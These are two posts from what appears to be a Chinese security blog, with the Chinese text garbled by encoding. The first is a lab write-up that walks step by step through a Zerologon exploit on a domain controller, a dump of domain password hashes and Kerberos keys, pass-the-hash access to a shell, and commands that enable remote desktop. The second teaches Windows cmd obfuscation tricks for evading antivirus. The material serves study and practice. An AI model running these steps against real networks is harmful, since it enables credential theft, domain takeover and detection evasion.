<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;Desktop]</span><br><span class="line">â””â”€$ proxychains nmap -Pn -sT 10.0.10.110 -p6379,80,8080,445,139    148 â¨¯ 1 âš™</span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-22 06:19 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:8080 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:139  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:80 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:6379 &lt;--socket error or timeout!</span><br><span class="line">Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 100.00% done; ETC: 06:20 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.0.10.110</span><br><span class="line">Host is up (12s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">80&#x2F;tcp   closed http</span><br><span class="line">139&#x2F;tcp  open   netbios-ssn</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds</span><br><span class="line">6379&#x2F;tcp closed redis</span><br><span class="line">8080&#x2F;tcp closed http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 45.54 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç "><a href="#CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç " class="headerlink" title="CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç )"></a>CVE-2020-1472ï¼ˆç½®ç©ºå¯†ç )</h4><p>æ²¡å•¥å¯ä»¥äº†åˆ©ç”¨çš„åœ°æ–¹ï¼Œç„¶åçœ‹äº†ä¸‹ å…¶ä»–å¸ˆå‚…çš„æ–‡ç« </p>
<p>è¿™é‡Œç”¨åˆ°äº† åŸŸå†…ææƒ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;Desktop]</span><br><span class="line">â””â”€$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110     1 â¨¯</span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line">                                                                             </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;Desktop]</span><br><span class="line">â””â”€$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯†ç è¢«ç½®ç©ºäº†</p>
<h4 id="ä½¿ç”¨impactet"><a href="#ä½¿ç”¨impactet" class="headerlink" title="ä½¿ç”¨impactet"></a>ä½¿ç”¨impactet</h4><p>ä½¿ç”¨ <code>secretsdump.py</code> dump hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;Desktop&#x2F;impacket&#x2F;impacket-0.9.24&#x2F;examples]</span><br><span class="line">â””â”€$ proxychains python3 secretsdump.py  vulntarget.com&#x2F;WIN2019\$@10.0.10.110  -just-dc  -no-pass  </span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br><span class="line">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:f835118efec7ef06133c3f228e69e554:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br><span class="line">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br><span class="line">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br><span class="line">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br><span class="line">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br><span class="line">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br><span class="line">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br><span class="line">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br><span class="line">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br><span class="line">WIN2016$:aes256-cts-hmac-sha1-96:f53f26ac32375f204b39a10dbe054714ac57f4ed1604e522db5b2ab51d719760</span><br><span class="line">WIN2016$:aes128-cts-hmac-sha1-96:1deb3de2d7567fd69e91c14c3dff8ce7</span><br><span class="line">WIN2016$:des-cbc-md5:c44cbff1e3153e85</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°administratorçš„hashå€¼ <code>aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</code> </p>
<p>ä½¿ç”¨ smbexec é€šè¿‡administratorçš„hashè¿æ¥cmd æ‹¿åˆ°åŸŸæ§çš„cmd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~&#x2F;Desktop&#x2F;impacket&#x2F;impacket-0.9.24&#x2F;examples]</span><br><span class="line">â””â”€$ proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110  </span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p><img src="/posts/3edb83f3/19.png" alt="æˆªå›¾"></p>
<br>

<p>ç ´è§£hash å»å¾—åˆ°åŸŸæ§çš„ç™»å½•å¯†ç </p>
<p>å¾—åˆ°å¯†ç ä¸º Admin@666</p>
<br>

<h4 id="ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢"><a href="#ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢" class="headerlink" title="ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢"></a>ç„¶åå¼€å¯3389è¿œç¨‹æ¡Œé¢</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/3edb83f3/20.png" alt="æˆªå›¾"></p>
<br>

<p><code>proxychains rdesktop 10.0.10.110</code></p>
<br>

<p><img src="/posts/3edb83f3/21.png" alt="æˆªå›¾"></p>
<p>æ²¡è¿ä¸Šâ€¦  æ ¹æ®æŠ¥é”™æŸ¥äº†ä¸‹è§£å†³æ–¹æ³•ï¼š<br>è¿›å…¥windowsç³»ç»Ÿï¼Œåœ¨â€œè¿œç¨‹æ¡Œé¢â€ä¸­ï¼Œå°†â€œä»…å…è®¸ä½¿ç”¨ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥ï¼ˆå»ºè®®ï¼‰â€å‹¾é€‰å»é™¤å³å¯ã€‚</p>
<p>è²Œä¼¼åªæœ‰è¿™æ ·æ‰èƒ½ç”¨rdesktopç™»å½•</p>
<p>ç„¶åæ‰¾äº†å¦ä¸€ç§æ–¹æ³• ä¸‹è½½<code>remmina</code> </p>
<p><code>sudo apt install remmina</code></p>
<p><img src="/posts/3edb83f3/22.png" alt="æˆªå›¾"></p>
<p>ç„¶åæˆåŠŸç™»å½•åˆ°åŸŸæ§çš„è¿œç¨‹æ¡Œé¢</p>
<p><img src="/posts/3edb83f3/23.png" alt="æˆªå›¾"></p>
<br>

<p>è¿™é¶åœºä»å¼€å§‹åˆ°ç°åœ¨ æäº†å¿«ä¸€å¤©äº† å¥½å¤šä¸œè¥¿éƒ½å¿˜è®°æ€ä¹ˆç”¨äº†ï¼Œå½“ç„¶ä¹Ÿå­¦äº†äº›æ–°ä¸œè¥¿ è¿˜æ˜¯æœ‰äº›æ”¶è·çš„ã€‚æ˜å¤©å†å›é¡¾ä¸‹ï¼Œç„¶åå°è¯•ä¸‹koadic </p>
]]></content>
  </entry>
  <entry>
    <title>cmdå‘½ä»¤æ··æ·†</title>
    <url>/posts/bac18dc8/</url>
    <content><![CDATA[<p>ç°åœ¨æ€è½¯å¤§éƒ½æ˜¯åº•å±‚é˜²å¾¡ï¼Œç›´æ¥æ··æ·†cmdæ²¡å•¥ç”¨ï¼Œè¿™é‡Œçš„è¯ä¸»è¦æ˜¯å­¦ä¸€ä¸‹æ€è·¯</p>
<h3 id="CMDå‘½ä»¤ç¬¦å·"><a href="#CMDå‘½ä»¤ç¬¦å·" class="headerlink" title="CMDå‘½ä»¤ç¬¦å·"></a>CMDå‘½ä»¤ç¬¦å·</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@:éšè—å‘½ä»¤çš„å›æ˜¾ã€‚</span><br><span class="line">~:å˜é‡æ‰©å±•æˆ–è€…æ‰©å±•ç¯å¢ƒå˜é‡æŒ‡å®šä½ç½®çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">%:å¼•ç”¨ç¯å¢ƒå˜é‡æˆ–è€…å•ä¸ª%è¡¨ç¤ºå¼•ç”¨å‘½ä»¤è¡Œå‚æ•°ã€‚</span><br><span class="line">^:å–æ¶ˆè½¬ä¹‰å­—ç¬¦ã€‚</span><br><span class="line">&amp;:å‘½ä»¤è¿æ¥å­—ç¬¦ã€‚</span><br><span class="line">ï¼š ç®¡é“ç¬¦ï¼Œå°†ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¾“å‡º,ä½œä¸ºä¸‹ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚</span><br><span class="line">:ï¼š æ ‡ç­¾ç¬¦,æ¥å—gotoå‘½ä»¤æ‰€æŒ‡å‘çš„æ ‡ç­¾ã€‚</span><br><span class="line">â€â€œ:ç•Œå®šç¬¦,ä½¿ç”¨å¸¦æœ‰ç©ºæ ¼çš„è·¯å¾„æ—¶ç”¨â€â€œå°†è·¯å¾„æ‹¬èµ·æ¥ã€‚</span><br><span class="line">&#x2F;: å…¶åçš„å­—ç¬¦æ˜¯å‘½ä»¤çš„åŠŸèƒ½å¼€å…³ã€‚</span><br><span class="line">&gt;: å‘½ä»¤é‡å®šå‘ç¬¦ï¼Œè¾“å…¥åœ¨å‰ï¼Œè¾“å‡ºåœ¨åï¼Œè¦†ç›–ä¹‹å‰çš„å†…å®¹ã€‚</span><br><span class="line">&gt;&gt;: å‘½ä»¤é‡å®šå‘ç¬¦ã€‚è¾“å…¥åœ¨å‰ï¼Œè¾“å‡ºåœ¨åï¼Œä¸è¦†ç›–ä¹‹å‰çš„å†…å®¹ã€‚</span><br><span class="line">&lt;:å°†åé¢æ–‡ä»¶çš„å†…å®¹è¾“å‡ºåˆ°å‰é¢ã€‚</span><br><span class="line">&#x3D; :èµ‹å€¼ç¬¦å·,ç”¨äºå˜é‡èµ‹å€¼ã€‚</span><br><span class="line">\ :å½“å‰è·¯å¾„æ‰€åœ¨çš„æ ¹è·¯å¾„ã€‚</span><br><span class="line">&amp;&amp; :è¿æ¥ä¸¤ä¸ªå‘½ä»¤,&amp;&amp;å‰çš„å‘½ä»¤æˆåŠŸæ—¶,æ‰æ‰§è¡Œ&amp;&amp;åçš„å‘½ä»¤ã€‚</span><br><span class="line"> 	ï¼šè¿æ¥ä¸¤ä¸ªå‘½ä»¤,	 	å‰çš„å‘½ä»¤å¤±è´¥æ—¶,æ‰æ‰§è¡Œ	 	åçš„å‘½ä»¤ã€‚</span><br><span class="line">$:findstrå‘½ä»¤ä¸­è¡¨ç¤ºä¸€è¡Œçš„ç»“æŸã€‚</span><br><span class="line">&#96;&#96;:for&#x2F;fä¸­è¡¨ç¤ºå®ƒä»¬æ‰€åŒ…å«çš„å†…å®¹å½“ä½œå‘½ä»¤è¡Œæ‰§è¡Œå¹¶åˆ†æå®ƒçš„è¾“å‡ºã€‚</span><br><span class="line">!: å»¶è¿Ÿå˜é‡,ä½¿ç”¨!!å°†å˜é‡åæ‰©èµ·æ¥è¡¨ç¤ºå¯¹å˜é‡å€¼çš„å¼•ç”¨ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="å¤§å°å†™-ç‰¹æ®Šå­—ç¬¦æ··æ·†"><a href="#å¤§å°å†™-ç‰¹æ®Šå­—ç¬¦æ··æ·†" class="headerlink" title="å¤§å°å†™/ç‰¹æ®Šå­—ç¬¦æ··æ·†"></a>å¤§å°å†™/ç‰¹æ®Šå­—ç¬¦æ··æ·†</h3><p>cmdä¸­å¤§å°å†™ä¸æ•æ„Ÿ å¯ä»¥å¤§å°å†™æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/bac18dc8/1.png" alt="æˆªå›¾"></p>
<h3 id="ç‰¹æ®Šå­—ç¬¦æ··æ·†"><a href="#ç‰¹æ®Šå­—ç¬¦æ··æ·†" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦æ··æ·†"></a>ç‰¹æ®Šå­—ç¬¦æ··æ·†</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01 ^"></a>0x01 ^</h4><p><code>^</code>æ˜¯cmdä¸­å¸¸è§çš„è½¬ä¹‰å­—ç¬¦ ä¸ä¼šå½±å“å‘½ä»¤çš„æ­£å¸¸æ‰§è¡Œã€‚</p>
<p><img src="/posts/bac18dc8/2.png" alt="æˆªå›¾"></p>
<h4 id="0x02-â€œâ€æ‹¼æ¥"><a href="#0x02-â€œâ€æ‹¼æ¥" class="headerlink" title="0x02 â€œâ€æ‹¼æ¥"></a>0x02 â€œâ€æ‹¼æ¥</h4><p><img src="/posts/bac18dc8/3.png" alt="æˆªå›¾"></p>
<h4 id="0x03-æ›¿æ¢ç©ºæ ¼"><a href="#0x03-æ›¿æ¢ç©ºæ ¼" class="headerlink" title="0x03  , ;æ›¿æ¢ç©ºæ ¼"></a>0x03  , ;æ›¿æ¢ç©ºæ ¼</h4><p><img src="/posts/bac18dc8/4.png" alt="æˆªå›¾"></p>
<p>ä½†æ˜¯è¿™ä¸ªæ’å…¥<code>net user</code>ä¸ä¼šæˆåŠŸ</p>
<h4 id="0x04-ï¼ˆï¼‰"><a href="#0x04-ï¼ˆï¼‰" class="headerlink" title="0x04 ï¼ˆï¼‰"></a>0x04 ï¼ˆï¼‰</h4><p><img src="/posts/bac18dc8/5.png" alt="æˆªå›¾"></p>
<br>

<br>

<h3 id="åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†"><a href="#åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†" class="headerlink" title="åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†"></a>åˆ©ç”¨ç¯å¢ƒå˜é‡æ··æ·†</h3><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>åœ¨cmdä¸‹ä½¿ç”¨<code>set</code> å¯ä»¥åˆ—ä¸¾å‡ºcmdä¸­çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ ä¸€èˆ¬ä½¿ç”¨<code>set a=who</code>è¿™ç§çš„éƒ½æ˜¯ä¸´æ—¶å˜é‡ é‡å¯åä¾¿ä¸ä¼šå­˜åœ¨  ä¸€èˆ¬ä½¿ç”¨callå‘½ä»¤æ¥è°ƒç”¨æ‹“å±•å˜é‡</p>
<p><img src="/posts/bac18dc8/6.png" alt="æˆªå›¾"></p>
<p>ï¼ˆ<code>cmd /c &quot;string&quot; è¡¨ç¤ºæ‰§è¡Œå­—ç¬¦ä¸²stringæ‰§è¡Œçš„å‘½ä»¤ ç„¶åç»ˆæ­¢</code>  å¯ä»¥é€šè¿‡ <code>cmd /?</code> æŸ¥çœ‹cmdä¸‹çš„è¯¦ç»†å‘½ä»¤ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST&gt;cmd &#x2F;c &quot;set var1&#x3D;ser&amp;&amp;set var2&#x3D;ne&amp;&amp;set var3&#x3D;t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/7.png" alt="æˆªå›¾"></p>
<br>

<h5 id="è®°ä¸€ä¸ªå°å‘"><a href="#è®°ä¸€ä¸ªå°å‘" class="headerlink" title="è®°ä¸€ä¸ªå°å‘"></a>è®°ä¸€ä¸ªå°å‘</h5><p>è®°ä¸€ä¸ªå°å‘<br><code>set t=&quot;am&quot; &amp;&amp; who%t%i  </code> å¤šæ¬¡æ‰§è¡ŒåªæˆåŠŸä¸€æ¬¡ ä¸çŸ¥é“ä¸ºä»€ä¹ˆ..åç»­å†è¿è¡Œ å‘½ä»¤éƒ½å¤±è´¥äº†<br>ç›´æ¥<code>echo %t%</code>  å¾—åˆ°ä¸º <code>&quot;am&quot;</code><br><img src="/posts/bac18dc8/8.png" alt="æˆªå›¾"></p>
<p>å°è¯•äº†ä¸‹ å‘ç°è¿™é‡Œå¯ä»¥ä¸ç”¨å»åŠ åŒå¼•å·ç©ºæ ¼è¿™ç±»çš„ ä¸ç„¶ä¼šè¢«åˆ†éš”å¼€ ä½†æ˜¯ç¬¬ä¸€æ¬¡èƒ½æ‰§è¡Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸ºå•¥ï¼Œä½†æ˜¯åé¢ä½¿ç”¨<code>call</code> ä¾¿å¯ä»¥æ‰§è¡Œç¯å¢ƒå˜é‡çš„å‘½ä»¤</p>
<h4 id="0x02-cmd-V-ON-å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•"><a href="#0x02-cmd-V-ON-å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•" class="headerlink" title="0x02 cmd /V:ON å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•"></a>0x02 cmd /V:ON å¯ç”¨å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•</h4><p>å½“å¯ç”¨ <code>/Vï¼šON</code> å ä½¿ç”¨ <code>%var% </code>æˆ– <code>!var! </code>æ¥æ‰©å±•å˜é‡ï¼Œ<code>!var!</code>å¯ä»¥ç”¨æ¥ä»£æ›¿<code>%var%</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;set var1&#x3D;ser&amp;&amp;set var2&#x3D;ne&amp;&amp;set var3&#x3D;t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br><span class="line">cmd &#x2F;V:ON &#x2F;c &quot;set var1&#x3D;ser&amp;&amp;set var2&#x3D;ne&amp;&amp;set var3&#x3D;t u&amp;&amp;call  !var2</span><br><span class="line">!!var3!!var1!</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/9.png" alt="æˆªå›¾"></p>
<h4 id="0x03-é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡"><a href="#0x03-é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡" class="headerlink" title="0x03 é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡"></a>0x03 é€šè¿‡æˆªå–ç¯å¢ƒå˜é‡</h4><p>é€šè¿‡<code>set </code> æŸ¥çœ‹å½“å‰çš„ç¯å¢ƒå˜é‡</p>
<p><code>%comspec%</code> å€¼çš„ç»“æœä¸º <code>C:\Windows\system32\cmd.exe</code> </p>
<p>å¯ä»¥é€šè¿‡æˆªå–åé¢éƒ¨åˆ†å»è°ƒç”¨cmd æ ¼å¼ä¸º<code>%VarName:~offset[,length]%</code> ç„¶åå°±å¯ä»¥æ ¹æ®ç¯å¢ƒå˜é‡å»æ‹¼æ¥å‡ºæƒ³è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p><img src="/posts/bac18dc8/10.png"></p>
<br>

<h3 id="ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤"><a href="#ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤" class="headerlink" title="ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤"></a>ä½¿ç”¨forå¾ªç¯æ‹¼æ¥å‘½ä»¤</h3><p>cmdä¸­é™¤äº†setå‘½ä»¤æ­ª è¿˜æœ‰ ftypeã€assocç­‰å‘½ä»¤</p>
<p><code>assoc</code> æ–‡ä»¶åæ‹“å±•å…³è”å‘½ä»¤ </p>
<p><code>assoc /?</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ˜¾ç¤ºæˆ–ä¿®æ”¹æ–‡ä»¶æ‰©å±•åå…³è”</span><br><span class="line"></span><br><span class="line">ASSOC [.ext[&#x3D;[fileType]]]</span><br><span class="line"></span><br><span class="line">  .ext      æŒ‡å®šè·Ÿæ–‡ä»¶ç±»å‹å…³è”çš„æ–‡ä»¶æ‰©å±•å</span><br><span class="line">  fileType  æŒ‡å®šè·Ÿæ–‡ä»¶æ‰©å±•åå…³è”çš„æ–‡ä»¶ç±»å‹</span><br><span class="line"></span><br><span class="line">é”®å…¥ ASSOC è€Œä¸å¸¦å‚æ•°ï¼Œæ˜¾ç¤ºå½“å‰æ–‡ä»¶å…³è”ã€‚å¦‚æœåªç”¨æ–‡ä»¶æ‰©å±•</span><br><span class="line">åè°ƒç”¨ ASSOCï¼Œåˆ™æ˜¾ç¤ºé‚£ä¸ªæ–‡ä»¶æ‰©å±•åçš„å½“å‰æ–‡ä»¶å…³è”ã€‚å¦‚æœä¸ä¸º</span><br><span class="line">æ–‡ä»¶ç±»å‹æŒ‡å®šä»»ä½•å‚æ•°ï¼Œå‘½ä»¤ä¼šåˆ é™¤æ–‡ä»¶æ‰©å±•åçš„å…³è”ã€‚</span><br></pre></td></tr></table></figure>

<p><code>ftype /?</code> </p>
<p>ftypeï¼šæ˜¾ç¤ºæˆ–ä¿®æ”¹ç”¨åœ¨æ–‡ä»¶æ‰©å±•åå…³è”ä¸­çš„æ–‡ä»¶ç±»å‹ï¼ŒæŒ‡å®šä¸€ç§ç±»å‹çš„æ–‡ä»¶é»˜è®¤ç”¨å“ªä¸ªç¨‹åºè¿è¡Œæˆ–æ‰“å¼€ã€‚å‘½ä»¤æ ¼å¼ä¸º<code> ftype [fileType[=[openCommandString]]</code></p>
<p><img src="/posts/bac18dc8/f1.png" alt="æˆªå›¾"></p>
<br>

<p><code>for /?</code>  ä½¿ç”¨æ–¹æ³•æŒºè¯¦ç»†çš„ å°±æ˜¯æ„Ÿè§‰æœ‰ç‚¹ä¸å¥½ç†è§£â€¦</p>
<p><img src="/posts/bac18dc8/f2.png" alt="æˆªå›¾"></p>
<p>for å¾ªç¯åœ¨æ··æ·†æ—¶æ˜¯ä¸€ç§è¾ƒä¸ºå¤æ‚çš„æ–¹å¼é€šå¸¸ä¼šä½¿ç”¨  /F å’Œ /L å‚æ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FOR &#x2F;L %variable IN (start,step,end) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">è¯¥é›†è¡¨ç¤ºä»¥å¢é‡å½¢å¼ä»å¼€å§‹åˆ°ç»“æŸçš„ä¸€ä¸ªæ•°å­—åºåˆ—ã€‚å› æ­¤ï¼Œ(1,1,5)å°†äº§ç”Ÿåºåˆ—12345ï¼Œ(5,-1,1)å°†äº§ç”Ÿåºåˆ—(54321)</span><br><span class="line"></span><br><span class="line">FOR &#x2F;F [&quot;options&quot;] %variable IN (file-set) DO command [command-parameters]</span><br><span class="line">FOR &#x2F;F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command [command-parameters]</span><br><span class="line">FOR &#x2F;F [&quot;options&quot;] %variable IN (&#39;command&#39;) DO command [command-parameters]</span><br><span class="line"></span><br><span class="line">delims&#x3D;xxx  ç”¨xxxè¿›è¡Œåˆ†å‰²å­—ç¬¦ä¸²</span><br><span class="line">delims&#x3D;f&#x3D; ç”¨fä¸&#x3D; è¿›è¡Œåˆ†å‰²å­—ç¬¦ä¸²</span><br><span class="line">tokens&#x3D;x,y,m-n </span><br><span class="line">tokens&#x3D;2 é€‰æ‹©åˆ†å‰²åçš„ç¬¬äºŒæ®µ</span><br><span class="line">usebackq</span><br><span class="line"></span><br><span class="line">for &#x2F;f &quot; delims&#x3D;f&#x3D; tokens&#x3D;2&quot; %f IN ( &#39;assoc .cmd&#39; ) do %f</span><br><span class="line">assoc .cmd è¿”å›ç»“æœä¸º .cmd&#x3D;cmdfile</span><br><span class="line">delims&#x3D;f&#x3D; ä¼šä½¿ç”¨få’Œ&#x3D;è¿›è¡Œåˆ†å‰²  